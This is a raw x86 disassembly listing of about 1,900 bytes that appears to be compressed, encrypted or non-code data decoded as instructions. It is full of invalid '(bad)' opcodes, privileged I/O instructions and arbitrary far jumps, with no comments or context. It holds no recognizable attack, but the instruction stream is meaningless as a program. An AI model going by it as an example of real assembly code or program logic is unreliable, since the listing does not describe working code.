  404f99:	sbb    esp,DWORD PTR [ebx+0x68af9c3]
  404f9f:	jne    0x404ff5
  404fa1:	xchg   ebx,eax
  404fa2:	sub    DWORD PTR [edx],esp
  404fa4:	sub    esi,eax
  404fa6:	jne    0x404f3f
  404fa8:	into   
  404fa9:	pop    ds
  404faa:	mov    dl,BYTE PTR [edi]
  404fac:	cwde   
  404fad:	test   ebp,0x22dd9808
  404fb3:	inc    esi
  404fb4:	pop    ds
  404fb5:	jns    0x404f7a
  404fb7:	(bad)
  404fba:	jbe    0x404f4d
  404fbc:	xchg   ebp,eax
  404fbd:	(bad)  
  404fbe:	imul   esp,DWORD PTR [ebx-0x24],0x2e52bf69
  404fc5:	pusha  
  404fc6:	mov    esi,es
  404fc8:	(bad)  
  404fc9:	lods   eax,DWORD PTR ds:[esi]
  404fca:	test   BYTE PTR [ecx-0x451c6704],ch
  404fd0:	dec    edx
  404fd2:	sti    
  404fd3:	xor    eax,0xaf8400c5
  404fd8:	inc    ebp
  404fd9:	je     0x404fc9
  404fdb:	scas   eax,DWORD PTR es:[edi]
  404fdc:	pop    edi
  404fdd:	pop    eax
  404fde:	dec    esp
  404fdf:	(bad)  
  404fe0:	push   DWORD PTR [ebx+0x4e]
  404fe3:	imul   edi,DWORD PTR [edx],0xffffffc1
  404fe6:	adc    BYTE PTR [edi],ah
  404fe8:	xor    al,0x22
  404fea:	and    DWORD PTR [ebp-0x768bdda0],ecx
  404ff0:	mov    eax,0xc2fb7741
  404ff5:	sub    al,0x94
  404ff7:	mov    ds:0xd3288d24,eax
  404ffc:	push   edx
  404ffd:	xor    BYTE PTR [eax-0x239127c5],bh
  405003:	lahf   
  405004:	cs xchg ebp,eax
  405006:	xchg   edx,eax
  405007:	xchg   esp,eax
  405008:	loope  0x40505a
  40500a:	and    eax,0x866391da
  40500f:	or     ebx,DWORD PTR [ecx-0x3]
  405012:	jb     0x404fe1
  405014:	ret    
  405015:	fwait
  405016:	retf   
  405017:	les    edx,FWORD PTR [ecx+0x59f2b536]
  40501d:	jmp    0xba3cec0d
  405022:	sbb    bl,BYTE PTR [ebp-0x2d]
  405025:	pop    ecx
  405026:	ret    
  405027:	mov    es,ecx
  405029:	cs iret 
  40502b:	clc    
  40502c:	outs   dx,DWORD PTR ds:[esi]
  40502d:	jns    0x405005
  40502f:	clc    
  405030:	retf   0xd89a
  405033:	je     0x405027
  405035:	jg     0x404fda
  405037:	push   edi
  405038:	jecxz  0x405077
  40503a:	lahf   
  40503b:	(bad)  
  40503c:	adc    DWORD PTR [eax+0x31],0x786aca63
  405043:	jb     0x405027
  405045:	outs   dx,BYTE PTR ds:[esi]
  405046:	adc    esi,DWORD PTR [eax-0x38da768f]
  40504c:	sti    
  40504d:	ins    BYTE PTR es:[edi],dx
  40504e:	(bad)  
  40504f:	clc    
  405050:	jp     0x4050b4
  405052:	mov    ecx,0x21c82b47
  405057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405058:	jae    0x405041
  40505a:	dec    ebp
  40505b:	jmp    0x78f52105
  405060:	arpl   WORD PTR [eax],bx
  405062:	mov    ds:0x3999f18f,al
  405067:	shr    DWORD PTR [edi-0x5f],0xbb
  40506b:	cs mov ah,0xd
  40506e:	in     eax,0x8a
  405070:	lahf   
  405071:	xor    al,0xaf
  405073:	jge    0x4050a4
  405075:	pop    edi
  405076:	xor    eax,0xc0b41ae9
  40507b:	cs out dx,al
  40507d:	and    ah,al
  40507f:	aaa    
  405080:	pop    ss
  405081:	dec    ebx
  405082:	div    BYTE PTR [eax-0x383537cd]
  405088:	imul   edi,ecx,0xbcd01430
  40508e:	stos   BYTE PTR es:[edi],al
  40508f:	or     eax,edi
  405091:	lea    ebp,[ecx]
  405093:	mov    ds:0xb7345863,al
  405098:	pop    es
  405099:	mov    edx,DWORD PTR [ecx+0x45f46ae0]
  40509f:	nop
  4050a0:	push   eax
  4050a1:	jg     0x4050d5
  4050a3:	mov    esi,0x4262a163
  4050a8:	push   edi
  4050a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050aa:	push   ds
  4050ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050ac:	lea    ebp,[edi]
  4050ae:	iret   
  4050af:	inc    edx
  4050b0:	in     eax,dx
  4050b1:	xor    DWORD PTR [eax],esi
  4050b3:	aaa    
  4050b4:	mov    dh,0x4e
  4050b6:	retf   
  4050b7:	xchg   ebx,eax
  4050b8:	and    BYTE PTR fs:[eax],bh
  4050bb:	sub    ebx,DWORD PTR [edi-0x14b91806]
  4050c1:	iret   
  4050c2:	icebp  
  4050c3:	inc    esi
  4050c4:	inc    ebp
  4050c5:	test   edi,esp
  4050c7:	sbb    DWORD PTR [edi],eax
  4050c9:	adc    DWORD PTR [eax+0x7d27d64a],0x9d34506a
  4050d3:	rcl    ah,1
  4050d5:	clc    
  4050d6:	mov    cl,0x57
  4050d8:	adc    dh,BYTE PTR [ebp+ebx*8-0x1f2261b6]
  4050df:	inc    ebx
  4050e0:	pop    esp
  4050e1:	pushf  
  4050e2:	dec    edx
  4050e3:	jmp    0x908:0x9416f6aa
  4050ea:	jb     0x4050f2
  4050ec:	stos   DWORD PTR es:[edi],eax
  4050ed:	mov    BYTE PTR [esi],bl
  4050ef:	adc    DWORD PTR [eax],eax
  4050f1:	lock inc edi
  4050f3:	dec    edx
  4050f4:	out    dx,al
  4050f5:	jne    0x4050d7
  4050f7:	test   al,ch
  4050f9:	lds    ebx,FWORD PTR [ecx]
  4050fb:	jne    0x4050c3
  4050fd:	pop    edi
  4050fe:	sub    esp,0x3
  405101:	push   eax
  405103:	pusha  
  405104:	aad    0x14
  405106:	pop    ds
  405107:	in     eax,0x3f
  405109:	and    DWORD PTR [edx+0x6d],edi
  40510c:	mov    bh,0x12
  40510e:	cmp    DWORD PTR [ebx],ebp
  405110:	adc    DWORD PTR [esi],edx
  405112:	pop    ds
  405113:	sub    ebx,DWORD PTR [ecx]
  405115:	in     eax,0xa2
  405117:	in     eax,0x56
  405119:	cld    
  40511a:	sub    bh,BYTE PTR [ecx]
  40511c:	or     esp,ebx
  40511e:	dec    ebx
  40511f:	and    DWORD PTR [ebx],esi
  405121:	jmp    0x4050b6
  405123:	shr    BYTE PTR [esp+esi*4],cl
  405126:	aas    
  405127:	jne    0x4050e2
  405129:	xlat   BYTE PTR ds:[ebx]
  40512a:	gs (bad) 
  40512d:	ror    BYTE PTR [edi+0x8db3764],0xbe
  405134:	(bad)  
  405135:	jmp    0xd12728c0
  40513a:	cmp    DWORD PTR [eax-0x21],eax
  40513d:	fstp   DWORD PTR [edi+0x78]
  405140:	inc    esp
  405141:	rol    DWORD PTR ds:0x88061291,1
  405147:	jnp    0x40518c
  405149:	add    edi,eax
  40514b:	dec    edi
  40514c:	xchg   esp,eax
  40514d:	sbb    DWORD PTR [edx+0x4],0x97e8b71d
  405154:	popa   
  405155:	inc    edx
  405156:	dec    edi
  405157:	dec    ebx
  405158:	lds    esp,FWORD PTR [edx]
  40515a:	and    cl,BYTE PTR [ebp+0x1ecee921]
  405160:	leave  
  405161:	adc    DWORD PTR [ebx],0x1157b585
  405167:	mov    ds:0x51f35a24,al
  40516c:	rcl    DWORD PTR ds:0x7a3ec997,cl
  405172:	mov    cl,BYTE PTR [ebp-0x17]
  405175:	out    0x10,al
  405177:	(bad)  
  405178:	jmp    0xf9b6:0x493d3b88
  40517f:	sub    BYTE PTR [ebp+0x5014bec8],dh
  405185:	adc    al,0x15
  405187:	xchg   edi,eax
  405188:	adc    al,0xa2
  40518a:	jecxz  0x405178
  40518c:	mov    ds:0x6d11f7d5,al
  405191:	fcmovnbe st,st(7)
  405193:	lock jns 0x40516b
  405196:	int    0x29
  405198:	je     0x405165
  40519a:	mul    BYTE PTR [ebx]
  40519c:	and    BYTE PTR [edi-0x21],0x64
  4051a0:	push   eax
  4051a1:	add    eax,0xe6e0206
  4051a6:	pop    ss
  4051a7:	aas    
  4051a8:	adc    eax,0x2a7aab15
  4051ad:	mov    bh,0x1b
  4051af:	fwait
  4051b0:	in     al,dx
  4051b1:	data16 int 0x2a
  4051b4:	ins    DWORD PTR es:[edi],dx
  4051b5:	rcr    DWORD PTR [ebx],0xd3
  4051b8:	leave  
  4051b9:	popf   
  4051ba:	in     al,0x82
  4051bc:	les    edi,FWORD PTR [esi]
  4051be:	shr    DWORD PTR ds:0xa47ec5d0,0xa2
  4051c5:	in     al,0x2a
  4051c7:	jno    0x405229
  4051c9:	mov    ds:0x678e2907,eax
  4051ce:	ds int3 
  4051d0:	pop    ebx
  4051d1:	std    
  4051d2:	popf   
  4051d3:	fcmovbe st,st(5)
  4051d5:	jl     0x405179
  4051d7:	call   0xdd40107f
  4051dc:	mov    ds:0xad4054a9,eax
  4051e1:	dec    ebx
  4051e2:	fs sub al,0x55
  4051e5:	mov    edx,0xbb981ea3
  4051ea:	or     BYTE PTR [esi-0x1e],bh
  4051ed:	lock scas al,BYTE PTR es:[edi]
  4051ef:	ins    BYTE PTR es:[edi],dx
  4051f0:	jmp    0x4051fc
  4051f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051f3:	xchg   edi,eax
  4051f4:	mov    bl,0x2a
  4051f6:	mov    ds:0x8158a4a0,al
  4051fb:	jg     0x40518e
  4051fd:	enter  0xa30,0x3f
  405201:	gs popf 
  405203:	xchg   edi,eax
  405204:	xor    eax,0xeee035c9
  405209:	sub    ebp,eax
  40520b:	pop    ecx
  40520c:	ins    BYTE PTR es:[edi],dx
  40520d:	push   esi
  40520e:	lods   eax,DWORD PTR ds:[esi]
  40520f:	ret    
  405210:	jnp    0x40526a
  405212:	add    esp,0x9f979df7
  405218:	push   esi
  405219:	shl    BYTE PTR [esi],0x7b
  40521c:	mov    esp,0x223447bc
  405221:	scas   al,BYTE PTR es:[edi]
  405222:	mov    al,0x34
  405224:	nop
  405225:	loopne 0x40528a
  405227:	lock imul BYTE PTR ds:0x66e7b210
  40522e:	pop    edx
  40522f:	xor    dh,dh
  405231:	xor    al,0x12
  405233:	sahf   
  405234:	es aam 0x18
  405237:	popa   
  405238:	test   eax,0xe42b0f0e
  40523d:	clc    
  40523e:	sahf   
  40523f:	cmp    dl,BYTE PTR [ebx]
  405241:	dec    esi
  405242:	lahf   
  405243:	fld    TBYTE PTR [eax-0x6aad8bfc]
  405249:	add    BYTE PTR [ebx],ch
  40524b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40524d:	cbw    
  40524f:	mov    bh,0xec
  405251:	scas   al,BYTE PTR es:[edi]
  405252:	test   eax,0x46268913
  405257:	lods   al,BYTE PTR ds:[esi]
  405258:	mov    ebx,0xaff6570
  40525d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40525e:	loopne 0x40529a
  405260:	jmp    0xa676d2d7
  405265:	or     ch,al
  405267:	mov    edx,esp
  405269:	cmc    
  40526a:	mov    ebx,0xe8f29547
  40526f:	cmp    eax,DWORD PTR [ebp+0x405e148b]
  405275:	sti    
  405276:	test   DWORD PTR [eax],ecx
  405278:	xchg   ebp,eax
  405279:	xchg   edi,eax
  40527a:	cld    
  40527b:	pop    ds
  40527c:	push   ebx
  40527d:	fild   WORD PTR [esi-0xac8f430]
  405283:	daa    
  405284:	or     edx,DWORD PTR [edx+0x35dfb5fc]
  40528a:	in     al,dx
  40528b:	and    DWORD PTR ss:[ebp-0x554c6f],esi
  405292:	das    
  405293:	add    dl,cl
  405295:	adc    al,0x24
  405297:	jno    0x40530f
  405299:	frstor [esi+eax*2-0x2d]
  40529d:	stos   BYTE PTR es:[edi],al
  40529e:	es inc ebp
  4052a0:	adc    al,0xde
  4052a2:	ret    0x3db7
  4052a5:	xor    DWORD PTR [edx],esi
  4052a7:	adc    al,0xb1
  4052a9:	push   ds
  4052aa:	pop    esi
  4052ab:	push   ebx
  4052ac:	mov    al,0x4
  4052ae:	xor    BYTE PTR [esi+0x2259d4cc],0xe7
  4052b5:	xchg   edx,eax
  4052b6:	lds    edi,FWORD PTR [esi-0x751d0598]
  4052bc:	aaa    
  4052bd:	cmp    eax,0x53c97b76
  4052c2:	clc    
  4052c3:	xor    al,0xad
  4052c5:	add    BYTE PTR [esi],bh
  4052c7:	jmp    0x66e1721f
  4052cc:	out    dx,eax
  4052cd:	fdiv   QWORD PTR [esi+edi*4]
  4052d0:	inc    esi
  4052d1:	repz pusha 
  4052d3:	test   BYTE PTR [edx+edi*1],al
  4052d6:	mov    dh,0xb3
  4052d8:	xchg   edx,eax
  4052d9:	xlat   BYTE PTR ds:[ebx]
  4052da:	mov    fs,WORD PTR [esi+ebp*4+0x3b89f610]
  4052e1:	sub    ebx,esi
  4052e3:	into   
  4052e4:	dec    edi
  4052e5:	xchg   ebp,eax
  4052e6:	mov    ecx,0x94f28910
  4052eb:	mov    ebp,0x2c1d2b9f
  4052f0:	sti    
  4052f1:	out    dx,al
  4052f2:	aas    
  4052f3:	or     ah,BYTE PTR [edx-0x55d92b82]
  4052f9:	inc    esp
  4052fa:	(bad)  
  4052fb:	sub    dh,BYTE PTR [esp+esi*2+0x1c]
  4052ff:	pop    edx
  405300:	aam    0xd
  405302:	ret    
  405303:	push   esp
  405304:	enter  0xb27f,0x5f
  405308:	or     al,0x8d
  40530a:	mov    ebx,0x94218870
  40530f:	in     al,dx
  405310:	xor    DWORD PTR [edi+eax*8-0x196880ad],0x75c23db9
  40531b:	dec    edi
  40531c:	cwde   
  40531d:	mov    al,0x46
  40531f:	imul   edi,DWORD PTR [ebx-0x1e],0x6293dce5
  405326:	and    ah,cl
  405328:	pop    edi
  405329:	setl   dh
  40532c:	(bad)  
  40532d:	jno    0x4052bf
  40532f:	int    0xa4
  405331:	xor    DWORD PTR [ebx-0x2e],0xffffffc9
  405335:	dec    edi
  405336:	lahf   
  405337:	mov    ecx,0x877e3bb4
  40533c:	in     eax,dx
  40533d:	fidiv  DWORD PTR [eax-0xd2b0608]
  405343:	or     esi,DWORD PTR [ebx]
  405345:	movzx  edx,WORD PTR [eax]
  405348:	xor    DWORD PTR [esi-0x25c0d714],ecx
  40534e:	test   BYTE PTR ds:[ebx+0x1f0b4314],dl
  405355:	sub    BYTE PTR [eax-0x22c492e9],ah
  40535b:	in     eax,dx
  40535c:	jecxz  0x4053a4
  40535e:	imul   edx,DWORD PTR [edx+0x46104779],0x25286e93
  405368:	test   BYTE PTR [ecx+0x3c83caac],al
  40536e:	test   DWORD PTR ds:0x17bab96e,ebx
  405374:	shl    DWORD PTR [edi+0x15],cl
  405377:	aas    
  405378:	js     0x405358
  40537a:	enter  0x6435,0x1c
  40537e:	enter  0x7fe9,0x18
  405382:	outs   dx,BYTE PTR ds:[esi]
  405383:	test   DWORD PTR [esi+0x26],eax
  405386:	mov    eax,fs
  405388:	test   al,0xeb
  40538a:	pusha  
  40538b:	mov    edx,0x2ea6fd49
  405390:	mov    edi,0x62a294b9
  405395:	or     DWORD PTR [edx+0x5c],eax
  405398:	push   ebx
  405399:	clc    
  40539a:	rcr    DWORD PTR [edx+0x17c4fbce],0xe9
  4053a1:	sub    BYTE PTR [ebx+0x4d],cl
  4053a4:	fidivr DWORD PTR [edx+0x5e]
  4053a7:	mov    esi,0x846be525
  4053ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ad:	clc    
  4053ae:	std    
  4053af:	or     al,0x3f
  4053b1:	push   edi
  4053b2:	imul   esp,ebp,0x4e
  4053b5:	mov    dh,0x37
  4053b7:	dec    edx
  4053b8:	adc    al,0x14
  4053ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053bb:	cmp    eax,0x479486d2
  4053c0:	jno    0x405402
  4053c2:	icebp  
  4053c3:	cmp    BYTE PTR [edi+esi*2-0x6e],cl
  4053c7:	fidivr DWORD PTR [edi+esi*2-0x61]
  4053cb:	jg     0x405433
  4053cd:	inc    ebp
  4053ce:	in     al,0x64
  4053d0:	sbb    BYTE PTR [edx+ebp*2-0x6b],bl
  4053d4:	lods   al,BYTE PTR ds:[esi]
  4053d5:	pop    eax
  4053d6:	sbb    dl,0x9c
  4053d9:	ja     0x4053f6
  4053db:	je     0x40538b
  4053dd:	inc    esp
  4053de:	repnz cmc 
  4053e0:	pop    esi
  4053e1:	test   eax,0x180e039
  4053e6:	leave  
  4053e7:	mov    esi,0x440d00d8
  4053ec:	inc    eax
  4053ed:	stos   BYTE PTR es:[edi],al
  4053ee:	jae    0x4053ce
  4053f0:	dec    ebx
  4053f1:	mov    edx,0x87551338
  4053f6:	dec    ecx
  4053f7:	mov    ah,0xa4
  4053f9:	clc    
  4053fa:	bound  edx,QWORD PTR [ebp-0x75]
  4053fd:	push   cs
  4053fe:	pop    ecx
  4053ff:	stc    
  405400:	jnp    0x405386
  405402:	iret   
  405403:	pop    edx
  405404:	nop
  405405:	(bad)  
  405406:	aaa    
  405407:	adc    al,0xff
  405409:	outs   dx,DWORD PTR ds:[esi]
  40540a:	in     al,dx
  40540b:	inc    edi
  40540c:	jle    0x40544a
  40540e:	mov    dh,0x32
  405410:	jb     0x40546e
  405412:	mov    eax,0x9e039bb1
  405417:	ins    DWORD PTR es:[edi],dx
  405418:	jne    0x4053ee
  40541a:	push   ss
  40541b:	(bad)  [eax-0x18cabb5c]
  405421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405422:	inc    edi
  405423:	pop    ebp
  405424:	and    DWORD PTR [ebx],ebp
  405426:	(bad)  
  405427:	mov    esi,0x4dad52fc
  40542c:	(bad)  
  40542f:	aam    0xc2
  405431:	jge    0x4053d6
  405433:	mov    eax,ds:0xb09e9cd7
  405438:	dec    ebx
  405439:	arpl   WORD PTR [ebx],sp
  40543b:	and    eax,0xf5a6e8bf
  405440:	push   0x1b5b8688
  405445:	mov    DWORD PTR [ebx+esi*4-0xe],edi
  405449:	cmp    bh,BYTE PTR [edx]
  40544b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40544c:	inc    esp
  40544d:	jle    0x405436
  40544f:	es jp  0x4054bc
  405452:	cmp    edi,DWORD PTR [ebx]
  405454:	lds    edx,FWORD PTR [edi+ebx*4-0x4f]
  405458:	ret    0x2905
  40545b:	or     DWORD PTR [ebp+0x45],edi
  40545e:	push   eax
  40545f:	icebp  
  405460:	stc    
  405461:	mov    ah,0x9
  405463:	shl    DWORD PTR [ecx],cl
  405465:	jl     0x405476
  405467:	fld    QWORD PTR [ebx]
  405469:	jp     0x40546e
  40546b:	jno    0x405496
  40546d:	sti    
  40546e:	out    dx,eax
  40546f:	pop    DWORD PTR [ecx+0x38]
  405472:	outs   dx,BYTE PTR ds:[esi]
  405473:	cmp    ecx,DWORD PTR [ebx+0x9]
  405476:	fsubr  QWORD PTR ds:0xcd6a0ee2
  40547c:	xor    ebx,DWORD PTR [ecx+eiz*8]
  40547f:	shl    BYTE PTR [edi+0x5e],0x41
  405483:	pop    ebx
  405484:	jns    0x405485
  405486:	lods   eax,DWORD PTR ds:[esi]
  405487:	stos   DWORD PTR es:[edi],eax
  405488:	mov    ebx,0x48d8b235
  40548d:	adc    DWORD PTR [eax],esi
  40548f:	sub    bl,BYTE PTR [ecx]
  405491:	leave  
  405492:	inc    ebx
  405493:	ds (bad) 
  405495:	sub    edx,DWORD PTR ds:0x6c58fb63
  40549b:	push   ebx
  40549c:	shr    BYTE PTR [eax+0x76],1
  40549f:	pop    edx
  4054a0:	adc    cl,BYTE PTR [edx+ebx*4]
  4054a3:	sbb    DWORD PTR [ebx+ecx*2-0x5b],eax
  4054a7:	arpl   WORD PTR [eax],dx
  4054a9:	fwait
  4054aa:	xchg   ebp,eax
  4054ab:	mov    WORD PTR [ebx+0x5a],ds
  4054ae:	pop    ss
  4054af:	sbb    edx,DWORD PTR [eax]
  4054b1:	add    ebx,ecx
  4054b3:	(bad)  
  4054b4:	ficomp DWORD PTR [ebx-0x53]
  4054b7:	not    cl
  4054b9:	lods   al,BYTE PTR ds:[esi]
  4054ba:	or     eax,0xcd64f1a9
  4054bf:	sub    eax,0xc6f015d1
  4054c4:	inc    edx
  4054c5:	cmp    DWORD PTR [eax-0x2c3d6a31],edi
  4054cb:	test   BYTE PTR [edx-0x1c],dl
  4054ce:	jl     0x40551d
  4054d0:	lahf   
  4054d1:	test   BYTE PTR [eax],0xea
  4054d4:	add    al,0x43
  4054d6:	dec    ebx
  4054d7:	popa   
  4054d8:	cmp    eax,0xc9fc5252
  4054dd:	xchg   edi,eax
  4054de:	retf   0xa3bd
  4054e1:	xor    BYTE PTR [esi+0x4e],al
  4054e4:	xchg   esp,eax
  4054e5:	xor    BYTE PTR [eax-0x3bd1651b],bl
  4054eb:	sub    eax,DWORD PTR [ebx]
  4054ed:	stos   BYTE PTR es:[edi],al
  4054ee:	push   ebp
  4054ef:	(bad)  
  4054f0:	jge    0x405551
  4054f2:	inc    esp
  4054f3:	xchg   edi,eax
  4054f4:	test   eax,0x839db608
  4054f9:	xor    eax,0xc19a8f28
  4054fe:	int    0x25
  405500:	mov    esp,esp
  405502:	cli    
  405503:	pusha  
  405504:	pop    es
  405505:	dec    esp
  405506:	or     ch,cl
  405508:	and    edx,ebx
  40550a:	dec    ebp
  40550b:	lock stos DWORD PTR es:[edi],eax
  40550d:	dec    edi
  40550e:	imul   DWORD PTR ds:0x6cbf0259
  405514:	pop    esp
  405515:	mov    cl,0x93
  405517:	ds cld 
  405519:	std    
  40551a:	mov    esp,0x790eafeb
  40551f:	pop    eax
  405520:	xor    DWORD PTR [ecx-0x29],ecx
  405523:	ss jns 0x4054d4
  405526:	sbb    bh,al
  405528:	aaa    
  405529:	mov    ebp,edx
  40552b:	(bad)  
  40552c:	jnp    0x405536
  40552e:	mov    esp,0x7447ecf2
  405533:	cdq    
  405534:	(bad)  
  405535:	repz dec esp
  405537:	mov    eax,ds:0xd101437
  40553c:	or     eax,0x6d01f359
  405541:	pop    eax
  405542:	or     edx,DWORD PTR [ecx-0x67]
  405545:	daa    
  405546:	push   edi
  405547:	imul   esp,DWORD PTR [edx+eiz*2+0x56],0xc280f9d0
  40554f:	imul   BYTE PTR [esp+esi*8]
  405552:	push   ecx
  405553:	ja     0x405523
  405555:	sar    DWORD PTR [ebx-0x7dbaa85f],0x67
  40555c:	loope  0x4055ae
  40555e:	push   ecx
  40555f:	adc    BYTE PTR [edx+0x70b075a],bh
  405565:	int3   
  405566:	xor    DWORD PTR ds:[edi-0x37],eax
  40556a:	cmp    al,0xbd
  40556c:	mov    bh,0xdf
  40556e:	daa    
  40556f:	fisub  WORD PTR [edx]
  405571:	fcomp  QWORD PTR [ecx-0x3a8807bc]
  405577:	xor    eax,0x99f03cd5
  40557c:	mov    BYTE PTR [eax],ah
  40557e:	in     eax,dx
  40557f:	and    al,0xca
  405581:	outs   dx,DWORD PTR ds:[esi]
  405582:	pushf  
  405583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405584:	or     ah,dh
  405586:	test   eax,0x716f7b70
  40558b:	mov    al,0x15
  40558d:	jno    0x40552c
  40558f:	je     0x40558e
  405591:	loopne 0x4055df
  405593:	retf   
  405594:	in     al,dx
  405595:	jle    0x4055e1
  405597:	jg     0x405582
  405599:	mov    ah,0xfa
  40559b:	aas    
  40559c:	shl    DWORD PTR [edi+0x32529388],1
  4055a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055a3:	and    al,0xad
  4055a5:	(bad)  
  4055a6:	jbe    0x4055ab
  4055a8:	fstp   DWORD PTR [edx]
  4055aa:	fwait
  4055ab:	enter  0xa8fd,0x12
  4055af:	sbb    edx,DWORD PTR [edi+edx*8+0x17]
  4055b3:	dec    ebp
  4055b4:	cdq    
  4055b5:	enter  0x26c2,0xa4
  4055b9:	dec    ebp
  4055ba:	call   0xda20f74e
  4055bf:	sbb    eax,0x5bf42620
  4055c4:	stos   DWORD PTR es:[edi],eax
  4055c5:	rol    ah,cl
  4055c7:	jge    0x4055a4
  4055c9:	aam    0x36
  4055cb:	inc    eax
  4055cc:	mov    cl,0x57
  4055ce:	stos   BYTE PTR es:[edi],al
  4055cf:	leave  
  4055d0:	cmp    esp,DWORD PTR [esi]
  4055d2:	xor    BYTE PTR [ebp+0x6765787e],0x78
  4055d9:	jns    0x4055ad
  4055db:	jg     0x405611
  4055dd:	data16 mov ah,0xeb
  4055e0:	mov    ebx,0x511a12c8
  4055e5:	neg    ebx
  4055e7:	stc    
  4055e8:	mov    eax,ds:0xeba5554c
  4055ed:	(bad)  
  4055ee:	push   esi
  4055ef:	dec    ebp
  4055f0:	(bad)  [edi-0x25]
  4055f3:	(bad)  
  4055f4:	pop    esi
  4055f5:	(bad)  
  4055f6:	xor    cl,BYTE PTR [eax-0x3da57c76]
  4055fc:	mov    ds:0xf374fe47,eax
  405601:	pop    ebp
  405602:	jmp    0x9e1e:0x6d76064d
  405609:	cld    
  40560a:	push   edi
  40560b:	inc    edi
  40560c:	(bad)  
  40560d:	and    BYTE PTR [ecx+eiz*2],dl
  405610:	adc    BYTE PTR [eax-0x35d7c261],dh
  405616:	fadd   DWORD PTR [eax]
  405618:	cli    
  405619:	xchg   edx,eax
  40561a:	aam    0x29
  40561c:	xlat   BYTE PTR ds:[ebx]
  40561d:	mov    ch,ah
  40561f:	rep stos DWORD PTR es:[edi],eax
  405621:	enter  0xc73a,0xcf
  405625:	in     eax,0x40
  405627:	push   0xffffffba
  405629:	jl     0x405629
  40562b:	and    dh,al
  40562d:	fwait
  40562e:	dec    eax
  40562f:	dec    ebx
  405630:	shl    ebx,1
  405632:	dec    eax
  405633:	test   DWORD PTR [ebp+0x5f6f93cd],edi
  405639:	mov    edi,edx
  40563b:	leave  
  40563c:	cmp    cl,cl
  40563e:	mov    esi,0x3c6d3e0f
  405643:	or     DWORD PTR [esi-0x32607b67],ecx
  405649:	xchg   ebx,eax
  40564a:	cld    
  40564b:	add    cl,al
  40564d:	cmc    
  40564e:	fbstp  TBYTE PTR ds:0x2a75184f
  405654:	mov    cl,0xc9
  405656:	dec    eax
  405657:	cmc    
  405658:	fdivrp st(3),st
  40565a:	scas   eax,DWORD PTR es:[edi]
  40565b:	pop    esi
  40565c:	test   DWORD PTR [ecx],ecx
  40565e:	stc    
  40565f:	pop    ebp
  405660:	pop    ecx
  405661:	and    dh,bl
  405663:	adc    bh,BYTE PTR [ebx+edi*4+0x2979ebe]
  40566a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40566b:	mov    DWORD PTR [edi],eax
  40566d:	iret   
  40566e:	test   BYTE PTR [edx+edi*8+0x684cd415],bl
  405675:	or     BYTE PTR [ecx],dl
  405677:	scas   al,BYTE PTR es:[edi]
  405678:	push   0xb7b47a0b
  40567d:	xor    eax,0x50569ef8
  405682:	rcl    ch,1
  405684:	pop    ecx
  405685:	and    eax,0x57c4ccaf
  40568a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40568b:	lahf   
  40568c:	in     al,dx
  40568d:	dec    ebx
  40568e:	mov    edi,0x3edfed12
  405693:	dec    ebx
  405694:	inc    ecx
  405695:	or     al,0x12
  405697:	gs dec eax
  405699:	add    edx,eax
  40569b:	jle    0x405678
  40569d:	xor    eax,esp
  40569f:	neg    DWORD PTR [eax+0x2732dd13]
  4056a5:	mov    ecx,0x5c1de89e
  4056aa:	retf   
  4056ab:	pusha  
  4056ac:	adc    eax,eax
  4056ae:	mov    dl,BYTE PTR [edi-0x3845ff22]
  4056b4:	mov    ebp,0x2c4f3851
  4056b9:	or     al,0xe3
  4056bb:	sub    eax,0xb3818f64
  4056c0:	jmp    FWORD PTR [edi+0x14]
  4056c3:	nop
  4056c4:	data16 fisubr DWORD PTR [ebp+esi*1+0x69]
  4056c9:	enter  0x7949,0xe
  4056cd:	cmp    dh,BYTE PTR [eax-0x1]
  4056d0:	sysenter 
  4056d2:	(bad)  
  4056d3:	shr    DWORD PTR [ebp+0x56],1
  4056d6:	lods   eax,DWORD PTR ds:[esi]
  4056d7:	add    al,0x82
  4056d9:	mov    ds:0xace06195,eax
  4056de:	jmp    0xae52:0x10e6ce2b
  4056e5:	xchg   DWORD PTR [ecx],ebp
  4056e7:	adc    DWORD PTR [edi+ebx*8-0x40b61d89],edx
  4056ee:	pop    ds
  4056ef:	outs   dx,BYTE PTR ds:[esi]
  4056f0:	fs mov ah,0xc2
  4056f3:	xchg   ebp,esi
  4056f5:	mov    al,ds:0xdbc4ae56
  4056fa:	pop    edx
  4056fb:	dec    esp
  4056fc:	adc    ebx,DWORD PTR [ecx-0x7b]
  4056ff:	sbb    DWORD PTR [ebp+0x3b],edx
  405702:	jae    0x40577e
  405704:	push   ebx
  405705:	push   ds
  405706:	mov    dl,0xfe
  405708:	sub    eax,0xe0e9f9d5
  40570d:	retf   
  40570e:	sbb    ecx,DWORD PTR [eax*8-0x2e269e7]
  405715:	pop    ecx
  405716:	fld    TBYTE PTR [eax-0x6c]
  405719:	aas    
  40571a:	aaa    
  40571b:	adc    cl,BYTE PTR [esi+eiz*4+0x38]
  40571f:	pop    eax
  405720:	or     edx,DWORD PTR [eax+0x2f]
  405723:	hlt    
  405724:	adc    bh,BYTE PTR [eax-0x70b5653c]
  40572a:	xchg   ch,cl
  40572c:	mov    esp,0x4b5be301
  405731:	rcl    BYTE PTR [esi],cl
  405733:	push   eax
  405734:	test   BYTE PTR ds:[ebx*8-0x2c101155],cl
  40573c:	or     ecx,0xe2bb5f8e
  405742:	jnp    0x40578d
  405744:	call   0xe2924f9
  405749:	and    al,0x8
  40574b:	fnstenv [eax-0x6bfc338c]
  405751:	dec    ecx
  405752:	cli    
  405753:	scas   eax,DWORD PTR es:[edi]
  405754:	popa   
  405755:	push   ebp
  405756:	jmp    0x4056e5
